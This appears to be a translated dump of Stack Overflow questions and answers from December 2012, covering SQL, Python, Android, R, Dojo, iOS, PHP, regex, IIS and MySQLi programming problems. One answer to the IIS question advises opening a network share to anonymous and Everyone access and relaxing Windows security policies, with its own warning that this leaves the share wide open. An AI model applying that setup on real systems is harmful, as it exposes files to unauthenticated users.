我在其他博客上尝试过，但无法解决这个问题。抱歉，如果我的问题没有那么清楚。任何帮助都会很棒！谢谢

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-12T17:23:47.510

非常简单和容易：您的存储过程需要**两个参数**-`@ParameterName`并且`@ParameterValue`- 但您的调用只提供**一个**......

你应该这样调用你的存储过程：

```
DECLARE @ParameterValue varchar(50) 

EXEC Getparameterdefaultvalues @ParameterName = 1, @ParameterValue = @ParameterValue OUTPUT

PRINT 'Result is: ' + @ParameterValue 
```

另外：您将检索到的值作为**输出参数**返回-因此您将单个值返回到变量中-您没有返回结果集（行/列）。

# python - Python Youtube API：上传功能不起作用

> ID：13845084
> 
> 赞同：0
> 
> 时间：2012-12-12T17:15:44.637
> 
> 标签：python, upload, youtube, youtube-api

我想创建一个允许用户将视频上传到 Youtube 的应用程序。这是我尝试过的代码（改编自[http://code.google.com/p/gdata-python-client/source/browse/tests/gdata_tests/youtube/service_test.py](http://code.google.com/p/gdata-python-client/source/browse/tests/gdata_tests/youtube/service_test.py)）：

```
my_media_group = gdata.media.Group(
                                       title = gdata.media.Title(text=title),
                                       description = gdata.media.Description(description_type='plain',
                                                                             text=description),
                                       keywords = gdata.media.Keywords(text= tags),
                                       category = gdata.media.Category(
                                                                       text='Autos',
                                                                       scheme='http://gdata.youtube.com/schemas/2007/categories.cat',
                                                                       label='Autos'),
                                       player=None
    )
    # Set Geo location to 37,-122 lat, long
    where = gdata.geo.Where()
    where.set_location((37.0,-122.0))
    video_entry = gdata.youtube.YouTubeVideoEntry(media=my_media_group, geo=where)
    print "Creating a video entry: done."
    print "Uploading video"
    new_entry = self.client.InsertVideoEntry(video_entry, filepath)
    print "Done uploading video." 
```

它总是卡在倒数第二行：

```
new_entry = self.client.InsertVideoEntry(video_entry, filepath) 
```

那么有什么问题呢？对文件路径是否有任何要求（例如，路径“C:\video.avi”是否有效？）

事实上，我只需要一种上传方式，所以请提出任何可能的解决方案。

编辑： 1\. 我尝试嵌入 Youtube Upload 小部件，但它似乎不起作用：（只有一个选项可以从网络摄像头加载，这也不起作用。）

```
<iframe id="widget" type="text/html" width="640" height="390"
  src="https://www.youtube.com/upload_embed" frameborder="0"></iframe> 
```

2.  我使用 QWebview 加载 Youtube 的上传页面，但 Youtube 总是返回错误。 [QWebview：上传到 Youtube 返回错误](https://stackoverflow.com/questions/13778169/qwebview-upload-to-youtube-return-error)

编辑2：

我将代码更改为：

```
def getYtSession(self, email = '', password =''):
    # if we do not want to reuse our session.
    if email != '' and password != '':
        yt_service = gdata.youtube.service.YouTubeService()
        yt_service.email = email
        yt_service.password = password

        #login.
        try:
            print yt_service.ProgrammaticLogin()
            self.email = email
            self.password = password
            self.logged_in = True
            self.emit(QtCore.SIGNAL('doneLogin(QString)'), QtCore.QString(email + " " + password))
            return yt_service
        except:
            #Display a warning dialog.
            self.logged_in = False
            self.emit(QtCore.SIGNAL('failedLogin()'))
            return None      
    elif self.yt_service: # we want to reuse the session.
        return self.yt_service
    else:
        return gdata.youtube.service.YouTubeService() 
```

在上传功能中：

```
self.yt_service = self.getYtSession(self.email, self.password)
    try:
        new_entry = self.yt_service.InsertVideoEntry(video_entry, filepath)
        print "Done uploading video."
        self.emit(QtCore.SIGNAL('doneUpload(QString)'), QtCore.QString('Title: ' + title + '\nPath: ' + filepath))
    except:
        print "Stack trace:"
        traceback.print_stack() 
```

它仍然不起作用。还有一个问题：堆栈跟踪没有任何帮助：

```
Stack trace:Login successfully. 
```

文件“D:\workplace\simple-media-player\trunk\MyPlayer\src\QtThread.py”，第 19 行，运行 self.function(*self.args,**self.kwargs) 文件“D:\workplace \simple-media-player\trunk\MyPlayer\src\videoplayer.py"，第 490 行，在 doRealUpload traceback.print_stack()

该消息（“登录成功。”）由发出信号 doneLogin(QString) 时调用的函数打印。如果我不放

```
new_entry = self.yt_service.InsertVideoEntry(video_entry, filepath)
        print "Done uploading video."
        self.emit(QtCore.SIGNAL('doneUpload(QString)'), QtCore.QString('Title: ' + title + '\nPath: ' + filepath)) 
```

在 try-except 中，它什么也不打印。

更多信息：我将视频信息设置如下： 路径：C：/Users/huynh/Desktop/REcord1.wmv 名称：'A test video' 标签：'test, youtube' 描述：fafafa

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T10:02:14.477

好的不要紧。[我在http://code.google.com/p/gdata-python-client/source/browse/tests/gdata_tests/youtube/service_test.py](http://code.google.com/p/gdata-python-client/source/browse/tests/gdata_tests/youtube/service_test.py)修改了代码，它运行良好！

# android - 从 andEngine 中的 onAreaTouched() 访问 Activity 成员

> ID：13845085
> 
> 赞同：-1
> 
> 时间：2012-12-12T17:15:49.427
> 
> 标签：android, andengine

我是 AndEngine 新手，现在我正在尝试了解基础知识。

我想知道的一件事：如何从 Sprite 的覆盖 onAreaTouched 访问主 BaseGameActivity 的成员？问题是我认为我不能在调用中包含对主要活动的引用，因为具有此签名的此方法是引擎默认调用的方法。

假设我有一个 OnScreen DPad，我将如何从 dpad 元素的 onAreaTouched() 方法访问我的角色精灵？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:40:31.670

我将游戏活动的引用传递给我的游戏中需要它的任何对象，然后我就可以访问活动成员。只要确保在活动对象死亡后您没有保留任何可能还活着的引用（以避免泄漏）。

# r - 确定同一周的日期

> ID：13845086
> 
> 赞同：8
> 
> 时间：2012-12-12T17:15:51.407
> 
> 标签：r

给定一个日期向量（可能跨越多年）：

`exampleDates = as.Date( 1 : 15, origin = as.Date( "2012-12-25" ) )`

我想生成一个标识符，将日期分组为几周。因此，假设日历从星期日开始：

*   26 日到 29 日将产生相同的标识符
*   第 30 到第 5 具有相同的 id
*   第 6 到第 9 具有相同的 id

这是一个有缺陷的尝试：

`strftime( exampleDates , format = "%Y%W" )`

它将第 31 天和第 1 天视为不同的周（不足为奇）。我正在寻找类似的东西，`strftime`它会生成一个标识符（字符、数字等），我可以用它来按周对日期进行分组。

我敢肯定那里已经有一些聪明的功能。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-12T17:26:19.927

这将为给定周内的日期组分配一个唯一整数：

```
origin <- as.Date("2012-12-9")  ## A Sunday
weekID <- as.numeric(exampleDates - origin) %/% 7

data.frame(date = exampleDates,
           weekday = weekdays(exampleDates),
           week = weekID)
#          date   weekday week
# 1  2012-12-26 Wednesday    2
# 2  2012-12-27  Thursday    2
# 3  2012-12-28    Friday    2
# 4  2012-12-29  Saturday    2
# 5  2012-12-30    Sunday    3
# 6  2012-12-31    Monday    3
# 7  2013-01-01   Tuesday    3
# 8  2013-01-02 Wednesday    3
# 9  2013-01-03  Thursday    3
# 10 2013-01-04    Friday    3
# 11 2013-01-05  Saturday    3
# 12 2013-01-06    Sunday    4
# 13 2013-01-07    Monday    4
# 14 2013-01-08   Tuesday    4
# 15 2013-01-09 Wednesday    4 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-12-12T17:32:36.637

使用差异时间，

```
floor(difftime(  exampleDates,as.Date( "2012-12-16" ), units = "week"))

time differences in weeks
 [1] 1 2 2 2 2 2 2 2 3 3 3 3 3 3 3 
```

# javascript - JsonRestStore 中的 labelAttribute 是从数组中的多个项目构建的？

> ID：13845091
> 
> 赞同：0
> 
> 时间：2012-12-12T17:16:01.430
> 
> 标签：javascript, json, dojo

在我试图加载到 RoundRectList 的数组中，我想要的标签数据（全名）被分成数组中的 3 个项目（“FullName”+“MiddleName”+“LastName”）。当我构建 JsonRestStore 时，我不能简单地写

```
var store = new JsonRestStore({ target: url, allowNoTrailingSlash: 1, labelAttribute: "FullName" + "MiddleName" + "LastName" }); 
```

因为它显示为正在寻找一个名为“FullNameMiddleNameLastName”的项目。如果我将这三个选项设置为变量，并作为labelAttribute传入，效果是一样的。

有什么方法可以在 JsonRestStore 的 labelAttribute 中做我想做的事情吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:27:29.287

我不确定你的意思是`dojo/store/JsonRest`还是`dojox/data/JsonRestStore`，但幸运的是我相信他们都支持这一点：

```
var store = new JsonRestStore({
    target: url,
    getLabel: function(i) {
        return i.FullName + " " + i.MiddleName + " " + i.LastName;
    }
}); 
```

我只能在 dojox 文档中找到它：http: [//dojotoolkit.org/api/1.8/dojox/data/JsonRestStore#getLabel](http://dojotoolkit.org/api/1.8/dojox/data/JsonRestStore#getLabel)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:38:49.030

您可能还希望/需要覆盖`getLabelAttributes`，因为它是 Read api 的一部分。但默认情况下，它只返回`[this.labelAttribute]`.

# android - Android replaceContentView 有一个可用的最大视图？

> ID：13845094
> 
> 赞同：0
> 
> 时间：2012-12-12T17:16:14.183
> 
> 标签：android, android-intent, view, replace

我正在使用这段代码（来自一个带有 textarea 和一些按钮的类，非常简单）：

```
final Intent i1=new Intent(getBaseContext(),Domanda9.class);
replaceContentView("Calledw", i1); 
```

和这个：

```
public void replaceContentView(String id, Intent newIntent){
    getLocalActivityManager().destroyActivity("Called", true);
    View view = getLocalActivityManager().startActivity(id,newIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)) .getDecorView(); 
    this.setContentView(view);
} 
```

更改我的“调查应用程序”中的视图，但我注意到在第 9 次更改后，该应用程序与此 logcat 崩溃： [https](https://dl.dropbox.com/u/16047047/log.txt) ://dl.dropbox.com/u/16047047/log.txt 也许有限制？我该如何解决这个问题？有办法清空东西吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:28:11.910

在添加新活动之前，请确保您正在销毁以前的活动。例如。

```
getLocalActivityManager().destroyActivity("Calledw", true); 
```

您在运行旧活动的同时仍在添加新活动，这最终会导致内存问题

只需确保为要销毁的活动传递正确的 ID

# ios - GKSession 与超过 2 个设备断开连接

> ID：13845099
> 
> 赞同：1
> 
> 时间：2012-12-12T17:16:41.703
> 
> 标签：ios, bluetooth, multiplayer, gksession

我们正在使用 GKSession 来设置游戏。这适用于 2 台设备，其中一台设备使用 GKSessionModeServer 设置，另一台使用 GKSessionModeClient。

但是，一旦我们有 2 个或更多客户端（3 个设备；1 个主机和 2 个客户端），其中一个客户端将在某个时候随机断开连接。没有调用错误处理程序（didFailWithError 或 connectionWithPeerFailed），只有服务器和客户端上的 didChangeState。断开连接通常在一分钟内发生，有时更短。

所有设备（2 个 iPhone 和 1 个模拟器）都在同一个无线网络上。一台物理设备运行iOS6.0.1，另一台运行5.1.1，在连接模拟器时都可以保持连接。只有 3 台设备（2 台真实设备，1 台模拟设备）才会出现问题。

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T19:22:41.240

我有同样的问题，但在我的应用程序中，当我连接第三个或第四个客户端（随机）时会发生这个问题。服务器收到断开连接事件，但客户端冻结。我注意到这总是最后一个连接的客户端在几秒钟后断开连接。我不明白如何解决这个问题，我找到了一个名为 idea flight 的应用程序，它通过 gamekit 管理客户端/服务器连接，最多可以管理 15 个客户端（如 GameKit 文档中所述），我对其进行了测试并且它可以工作。我在代码上迷失了三天，我正在考虑切换到标准套接字通信，但我将失去蓝牙支持。

编辑：我找到了问题的原因。当网络由同时运行 iOS 6 和早期 iOS 版本的设备组成时，就会出现此问题。如果网络仅由运行 iOS6 或仅以前版本的设备组成，一切都很好。更准确地说，这不是崩溃，而是卡住的客户端有一些线程正在等待互斥体，这意味着 GameKit 导致我们的应用程序陷入死锁。在 Apple Developer's Forum 上阅读时，我知道一些用户直接向 Apple 报告了此错误，但 Apple 没有回复他们。因此，目前，确保基于 GKSession 的应用程序安全运行的唯一方法是仅支持 iOS 6 或使用 Bonjour、套接字和低级蓝牙 API 从头开始​​编写网络通信系统。

# objective-c - NSInternalInconsistencyException - 自动释放池中对象的 nul 类

> ID：13845101
> 
> 赞同：0
> 
> 时间：2012-12-12T17:16:42.990
> 
> 标签：objective-c, exception, autorelease, pool

正如许多人现在应该知道的那样，我是 Objective-C 的新手，我需要一些帮助来完成这个项目。我收到错误消息`NSInternalInconsistencyException - nul class for object in autorelease pool`。

这是我的一些可能导致问题的源代码：

**GuiController.m**

```
#import "GuiController.h"
#import "AppDelegate.h"
#import "ClientSocket.h"
#import "UploaderThread.h"
#import "DownloaderThread.h"

// to see debug messages, change NO below to YES
#define DEBUGON YES
// buffer size for reading byte arrays to/from server
#define MAXDATASIZE 1024
/**
 * Foundations of Distributed Applications
 * see http://pooh.poly.asu.edu/Cst420
 * @author Christopher Sosa (smoothpinkjazz@gmail.com), ASU Polytechnic, Software Engineering
 * @version December 2012
 */
@implementation GuiController

- (id) initWithDelegate: (AppDelegate*) theDelegate
                   host: (NSString*) hostName
                   port: (NSString*) portNum {
  // set self to result of initializing parent. If initialization succeeds
  if ( (self = [super init])) {
    // set properties and increment the reference count for its object.
    appDelegate = [theDelegate retain];
    albTB = [appDelegate albumTB];
    [albTB setStringValue:[NSString stringWithFormat:
                            @"Probably should look for server %s:%s"                                         ,[hostName UTF8String],[portNum UTF8String]]];
    titCB = [appDelegate titleCB];
    [titCB setDelegate:self];
    authTB = [appDelegate authorTB];
    [authTB setDelegate:self];
    host = hostName;
    port = portNum;
    int songSockPortInt = [port intValue] + 100;
    NSString *songSockPort = [NSString stringWithFormat:@"%d", songSockPortInt];
    char *buf = malloc(MAXDATASIZE);
    NSString *identStr;
    if (buf) {
      mainSock = [[ClientSocket alloc] initWithHost:hostName portNumber:portNum];
      [mainSock connect];
      identStr = [mainSock receiveBytes:buf maxBytes:MAXDATASIZE beginAt:0];
      ident = [identStr intValue];
      songSock = [[ClientSocket alloc] initWithHost:host portNumber:songSockPort];
      [songSock connect];
    }
    [identStr release];
    free(buf);
  }
  return self;
}

- (void) dealloc {
  [appDelegate release];
  [albTB release];
  [titCB release];
  [authTB release];
  [mainSock release];
  [songSock release];
  [super dealloc];
}

- (void) saveLib {
  [self debug:[NSString stringWithFormat:@"asked to save.\n"]];
  NSString * saveStr = @"save";
  char * buf = malloc(MAXDATASIZE);
  if (buf) {
    int sent = [mainSock sendBytes:[saveStr UTF8String]
                          OfLength:[saveStr length]
                             Index:0];
    NSString* retStr = [mainSock receiveBytes: buf maxBytes:MAXDATASIZE beginAt:0];
    [[appDelegate albumTB] setStringValue:
    [NSString stringWithFormat:@"Save result: %s",[retStr UTF8String]]];
    free(buf);
    [self debug:[NSString stringWithFormat:@"save return: %s\n",
    [retStr UTF8String]]];
  }
  [[appDelegate albumTB] setStringValue: [NSString stringWithFormat:@"Saved"]];
}

- (void) restoreLib {
  NSString * restoreStr = @"restore";
  [self debug:[NSString stringWithFormat:@"asked to restore.\n"]];
  char * buf = malloc(MAXDATASIZE);
  if (buf) {
    int sent = [mainSock sendBytes:[restoreStr UTF8String]
                          OfLength:[restoreStr length]
                             Index:0];
    NSString* retStr = [mainSock receiveBytes: buf maxBytes:MAXDATASIZE beginAt:0];
    [[appDelegate albumTB] setStringValue:
    [NSString stringWithFormat:@"Restore result: %s",[retStr UTF8String]]];
    free(buf);
    [self debug:[NSString stringWithFormat:@"restore return: %s\n",
    [retStr UTF8String]]];
  }
  [[appDelegate albumTB]
    setStringValue:[NSString stringWithFormat:@"Restored"]];
}

- (void) addMD {
  NSString * addMusicStr = @"add";
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  ClientSocket *addSock;
  UploaderThread * uploader;
  @try {    
    [self debug:[NSString stringWithFormat:@"openWav called:\n"]];
    NSOpenPanel *panel;
    NSString *path;

    panel = [NSOpenPanel openPanel];
    [panel setAllowsMultipleSelection: NO];
    [panel runModalForTypes: [NSSound soundUnfilteredFileTypes]];

    path = [[panel filenames] objectAtIndex: 0];

    if (sound != nil) {
      [sound stop];
      [sound release];
    }
    sound = [[NSSound alloc] initWithContentsOfFile: path byReference: NO];
    if (!sound) {
      NSRunAlertPanel (@"Error",
                       @"Could not open selected file", @"OK", nil, nil);
      return;
    }
    NSString * authorStr = [authTB stringValue];
    NSString * titleStr = [titCB objectValueOfSelectedItem];
    NSString * albumStr = [albTB stringValue];
    NSString * song = [NSString stringWithFormat:@"%@@%@@%@ ", authorStr, titleStr, albumStr];

    addSock = [[ClientSocket alloc] initWithHost:host portNumber:@"9001"];
    [addSock connect];
    int sent = [mainSock sendBytes:[addMusicStr UTF8String]
                          OfLength:[addMusicStr length]
                             Index:0];
    int sentSong = [mainSock sendBytes:[song UTF8String]
                              OfLength:[song length]
                                 Index:0];
    uploader = [[UploaderThread alloc] initWithName:path client:self socket:addSock];
    [(NSThread*)uploader start];
  } @catch (NSException *e) {
    [self debug:[NSString stringWithFormat:@"%@ Exception (%@)", [e name], [e reason]]];
  } 
  [uploader release];
  [addSock release];
  [sound setDelegate: self];
  [pool release];
  [self refreshMD];
}

- (void) removeMD {
  NSString * removeMusicStr = @"remove";
  NSString * titleString = [titCB objectValueOfSelectedItem];
  [self debug:[NSString stringWithFormat:@"asked to remove:\n"]];
  @try {
    int sent = [mainSock sendBytes:[removeMusicStr UTF8String]
                          OfLength:[removeMusicStr length]
                             Index:0];

    int sent2 = [mainSock sendBytes:[titleString UTF8String]
                           ofLength:[titleString length]
                              Index:0];
  } @catch (NSException *e) {
    [self debug:[NSString stringWithFormat:@"%@ Exception (%@)", [e name], [e reason]]];
  }
  [[appDelegate albumTB]
       setStringValue:[NSString stringWithFormat:@"Music Description Removed"]];
}

- (void) refreshMD {
  NSString * refreshMusicStr = @"refresh";
  [self debug:[NSString stringWithFormat:@"asked to refresh\n"]];
  [[appDelegate albumTB]
    setStringValue:[NSString stringWithFormat:@"Music Descriptions Refreshed"]];
}

- (void) playMD {
  NSString * playMusicStr = @"play";
  ClientSocket *playSock;
  DownloaderThread *downloader;
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  @try {
    playSock = [[ClientSocket alloc] initWithHost:host portNumber:@"9002"];
    [playSock connect];
    int sent = [mainSock sendBytes:[playMusicStr UTF8String]
                          OfLength:[playMusicStr length]
                             Index:0];

    [self debug:[NSString stringWithFormat:@"asked to play:\n"]];;
    downloader = [[DownloaderThread alloc] initWithClient:self  socket:playSock];
  } @catch (NSException *e) {
    [self debug:[NSString stringWithFormat:@"%@ Exception (%@)", [e name], [e reason]]];
  }
  [playSock release];
  [downloader release];
  [pool release];
}

- (void) comboBoxSelectionDidChange: (NSNotification*)notification {
  NSComboBox*titCB = [appDelegate titleCB];
  NSString* selected = [titCB objectValueOfSelectedItem];
  [self debug:[NSString stringWithFormat:@"selected title: %s\n",
                        [selected UTF8String]]];

}

- (void) debug: (NSString*) aMessage{
   if(DEBUGON){
     NSString * fileName = @"/Users/lindquis/Courses/Cst420/Assigns/"
       "AssignsF12/Assign3/SampleAssign3/GUIMessages.txt";
      NSFileHandle* fh = [NSFileHandle fileHandleForWritingAtPath: fileName];
      [fh seekToEndOfFile];
      [fh writeData: [aMessage dataUsingEncoding:NSUTF8StringEncoding]];
      [fh closeFile];
      //printf("debug: %s\n", [aMessage UTF8String]);
   }
}

@end 
```

**客户端套接字.m**

```
#import "ClientSocket.h"

/**7
 * SER 321 Foundations of Distributed Applications,
 * based on the simple server and client sockets in C by Jeez.
 * See http://pooh.poly.asu.edu/Cst420
 * @author Christopher Sosa (smoothpinkjazz@gmail.com), ASU Polytechnic, Engineering
 * @version December 2012
 */

// get sockaddr, IPv4 or IPv6:
void *get_in_addr(struct sockaddr *sa){
    if (sa->sa_family == AF_INET) {
        return &(((struct sockaddr_in*)sa)->sin_addr);
    }
    return &(((struct sockaddr_in6*)sa)->sin6_addr);
}

@implementation ClientSocket
- (id) initWithHost: (NSString*) host portNumber: (NSString*) port {
   self = [super init];
   hostName = host;
   [hostName retain];
   portNum = port;
   [portNum retain];
   return self;
}

- (BOOL) connect {
   connected = YES;
   memset(&hints, 0, sizeof hints);
   hints.ai_family = AF_UNSPEC;
   hints.ai_socktype = SOCK_STREAM;
   if ((rv = getaddrinfo([hostName UTF8String], [portNum UTF8String],
                         &hints, &servinfo)) != 0) {
      fprintf(stderr, "client error getting host address: %s\n",
              gai_strerror(rv));
      connected = NO;
   }
   // loop through all the results and connect to the first we can
   for(p = servinfo; p != NULL; p = p->ai_next) {
      if ((sockfd = socket(p->ai_family,p->ai_socktype,p->ai_protocol)) == -1){
         perror("client error creating socket");
         connected = NO;
         continue;
      }
      int callret = connect(sockfd, p->ai_addr, p->ai_addrlen);
      if (callret == -1) {
#if defined(WINGS)
         closesocket(sockfd);
#else
         close(sockfd);
#endif
#if defined(WINGS)
         //printf("client failed to connect.\n");
#else
         inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr),
                   s, sizeof s);
         printf("client failed to connect to %s\n", s);
#endif
         //perror("client error connecting");
         connected = NO;
         continue;
      }
      break;
   }
   if (p == NULL) {
      printf("client failed to connect\n");
      connected = NO;
   }else{
#if defined(WINGS)
      //printf("client connected\n");
#else
      inet_ntop(p->ai_family, get_in_addr((struct sockaddr *)p->ai_addr),
                s, sizeof s);
      printf("client connected to %s\n", s);
#endif
      connected = YES;
   }
   return connected;
}

- (int) sendBytes: (char*) byteMsg OfLength: (int) msgLength Index: (int) at{
   int ret = send(sockfd, byteMsg, msgLength, 0);
   if(ret == -1){
      NSLog(@"client error sending bytes");
   }
   return ret;
}

- (NSString*) receiveBytes: (char*) byteMsg
                  maxBytes: (int) max
                   beginAt: (int) at {
   int ret = recv(sockfd, byteMsg, max-1, at);
   if(ret == -1){
      NSLog(@"client error receiving bytes");
   }
   byteMsg[ret+at] = '\0';
   NSString * retStr = [NSString stringWithUTF8String: byteMsg];
   return retStr;
}

- (BOOL) close{
   connected = NO;
   return YES;
}

- (void) dealloc {
   [hostName release];
   [portNum release];
   [super dealloc];
}

@end 
```

有谁知道这里似乎发生了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T03:38:09.720

我会打开僵尸，因为它可能试图释放已经释放的东西。

我在这里看到一个明显的问题：

```
identStr = [mainSock receiveBytes:buf maxBytes:MAXDATASIZE beginAt:0];
// ...
[identStr release]; 
```

顺便说一句，Analyzer 会发现这一点

# php - 如何阻止用户发送帖子请求

> ID：13845103
> 
> 赞同：0
> 
> 时间：2012-12-12T17:16:52.430
> 
> 标签：php

```
 if($_POST)
    {

        if($this->session->userdata('just_sended'))
        {
            echo 'just sended';
            exit();

        }

        $newdata = array(
                   'just_sended'  => true

        );
        $this->session->set_userdata($newdata);
    }
    else
    {
        $newdata = array(
                   'just_sended'  => false
        );
        $this->session->set_userdata($newdata);

    } 
```

这是用户发送发布请求时的代码，但我无法弄清楚为什么它不起作用，用户向“发送”按钮发送垃圾邮件，并且在我的数据库中出现重复项，有什么想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:20:48.200

在 Post 之后重定向用户，以便客户端无法通过按 F5 重新发布数据：

```
header("Location: /submitted.php");
echo 'just sended'; // will the user never see
exit(); 
```

**sumbitted.php：**

```
exit('just sended'); 
```

**注意：**您不得在标题行之前过帐任何其他数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:21:10.967

不要尝试通过会话来完成此操作，只需在插入您的信息之前查询您的数据库，查看带有一些唯一键（如他们的 IP 地址）的最后一篇文章，如果信息相同，则不要插入。

此外，如果您想确保它只是最近的插入，您可以存储一个时间戳，您不会阻止插入。

# ios - Is it possible to specify a particular target within a scheme?

> ID：13845110
> 
> 赞同：0
> 
> 时间：2012-12-12T17:17:06.060
> 
> 标签：ios, xcode

I have a static library that has full and lite variants

Then I have an app which has a target to link to the full version of the library and another target to link to the lite version of the library.

Sometimes I want to build the full app and sometimes I want to build the lite app.

A problem comes about because I am using the XCode plugin within Jenkin for automated builds and you supply to that the workspace and the targer, however the plugin is pretty shoddy and ignores the target, thus if I only have a single scheme I have no control over which target gets built.

Thus I thought about creating a lite scheme and a full scheme, however a scheme seems to contain all targets and there doesn't seem to be anyway of including/excluding which target/targets the scheme should contain. If there is where is it? I can't find it anywhere.

TIA

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T20:06:44.373

Select the Build step from the scheme editor to add and remove targets to build for the scheme. To exclude a target from a build for the scheme, select the target and click the minus button below the target list.

# regex - 正则表达式需要帮助

> ID：13845111
> 
> 赞同：1
> 
> 时间：2012-12-12T17:17:08.390
> 
> 标签：regex, wordpress, preg-replace, preg-replace-callback

我有一个内容块，其中的人名用双括号括起来。例如：

> Lorem ipsum dolor sit amet，consectetur [[Jane Doe]] adipisicing elit，sed do eiusmod tempor incididunt ut labore et dolore magna aliqua。Ut enim ad minim veniam, quis nostrud exercitation ullamco [[John Doe]] laboris nisi ut aliquip ex ea commodo consequat。Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur。Exceptioneur sint occaecat cupidatat non proident, [[Susan Van-Something]] sunt in culpa qui officia deserunt mollit anim id est laborum。

我正在尝试编写一个正则表达式，将名称从双括号中取出，并在内容中使用以下格式的链接替换它们：

> `<a href='http://www.example.com/jane-doe/'>Jane Doe</a>`

在 URL 中，空格被转换为连字符，并且整个名称都是小写的。

到目前为止我有

```
// the filter function
function names_brackets( $content ) {
    // regex replace the names with links
    // return the content
    return preg_replace_callback( "/^([[[A-Za-z0-9- ]+?]])/" , "names_callback" , $content);
}

// callback function to allow post processing
function names_callback ( $matches ) {
    $find = array(' ', '[', ']');
    $replace = array('-', '', '');
    return '<a href="http://www.example.com/' . strtolower( str_replace($find, $replace, $matches[1]) ) . '">' . str_replace(']', '', str_replace('[', '', $matches[1])) . '</a>';
} 
```

不幸的是，我怀疑正则表达式有问题。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:22:00.703

您需要转义文字括号并删除字符串开头的锚点：

```
"/(\[\[[A-Za-z0-9 -]+\]\])/" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T17:23:33.343

您的模式有点偏离 - 除其他外，您需要转义括号，如下所示：

```
/(\[\[[A-Za-z0-9\s]+\]\])/ 
```

...这将寻找 [[包括空格的一些文本]]

根据需要调整组。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-12T17:26:22.220

*您确实需要在模式中转义括号，但仍有改进的余地：如果您使用多个*捕获组，您实际上不必在回调函数中进行另一次搜索和替换。像这儿：

```
function names_brackets( $content ) {
    return preg_replace_callback('/(\[\[)([\w -]+?)(]])/',
               'names_callback', $content);
}

function names_callback ( $matches ) {
    return '<a href="http://www.example.com/' 
           . strtolower(str_replace(' ', '-', $matches[2])) 
           . "\">$matches[2]</a>";
} 
```

这样，左括号和右括号仍会从结果中删除，但回调函数甚至不必知道它们：它只使用第二组 - 具有名称的那一组。

# asp.net - 授予 IIS 应用程序池权限以写入另一台计算机上的目录

> ID：13845112
> 
> 赞同：1
> 
> 时间：2012-12-12T17:17:09.470
> 
> 标签：asp.net, iis

总的来说，我完全迷失了 IIS，所以我希望这是一个简单的问题，你们中的任何一个人都可以帮助我解决：

我有一个在机器“Foo”上运行的 ASP.NET 应用程序。它的部分工作是根据最终用户的请求将文本文件导出到特定文件夹中。

碰巧输出目录需要在另一台机器上，机器“Bar”。

所以没问题，我说，**我只要给\FOO\IIS App Pool\DefaultAppPool 对Bar 上指定目录的读/写权限。但是，我似乎无法更改位置以添加此用户并分配此权限。**

有谁知道我做错了什么？这似乎是我应该能够做到的。

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-12T17:20:40.013

尝试将所需文件夹的权限直接授予正在执行应用程序池的用户。（我的意思是，直接从操作系统，在 IIS 之外）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-16T17:19:45.450

我有一个类似的问题。这是在同一 Active Directory 中的两台计算机之间

我成功执行了以下操作：

1.  分配共享和 ntfs 权限，允许完全访问每个人、访客和匿名登录
2.  在具有共享的计算机上打开本地策略安全选项和用户权限分配
3.  启用策略“网络访问：让所有人权限适用于匿名用户”
4.  禁用策略“网络访问：限制对命名管道和共享的匿名访问”

[我用这个作为参考](http://social.technet.microsoft.com/Forums/windowsserver/en-US/fba2f5f0-9069-48cd-a534-64ce7ba9cc97/windows-2008-r2-domain-how-to-allow-anonymous-access-to-1-folder-share?forum=winserverfiles)

当然，这是将此共享设置为**WIDE OPEN**，请睁大眼睛使用。

# php - 如果在循环中使用 MySQLi 准备好的语句，我什么时候调用 bind_param？

> ID：13845113
> 
> 赞同：6
> 
> 时间：2012-12-12T17:17:13.323
> 
> 标签：php, mysql, loops, mysqli

我正在尝试学习如何将准备好的语句与 MySQLi 一起使用来插入数据。

尽管准备好的语句因其能够有效地重复执行类似语句而受到称赞，但我似乎无法找到使用 MySQLi 在循环中执行多个语句的示例。我**对以下内容特别困惑**：

*   `bind_param`是在我的循环之前还是在我的循环内调用
*   是否在调用之前或之后为我的变量赋值`bind_param`

大多数关于准备好的语句的教程都使用 PDO。使用 PDO，可以将一组参数值传递给`execute`，而无需调用`bindParam`. MySQLi 并非如此。

PHP 手册[`mysqli_prepare`](http://php.net/mysqli.prepare.php)条目有一个示例，显示了以下操作顺序：

1.  给变量赋值
2.  准备声明
3.  绑定变量
4.  执行
5.  关

从以上判断，我假设我需要在循环中调用绑定语句。

但是，PHP 手册[`mysqli_stmt_execute`](http://php.net/mysqli-stmt.execute.php)条目有一个示例，显示了以下操作顺序：

1.  准备声明
2.  绑定变量
3.  给变量赋值
4.  执行
5.  给变量赋值
6.  执行
7.  关

请注意，此示例未显示的一件事是首次声明变量的位置。我认为将未声明的变量传递给`bind_param`会生成一个通知。我终于发现我可以传递未定义的变量，因为它们是通过引用传递的。

**问题**：
一种操作顺序是否优于另一种操作顺序？还是仅仅取决于你在做什么？其中一个有什么问题吗？

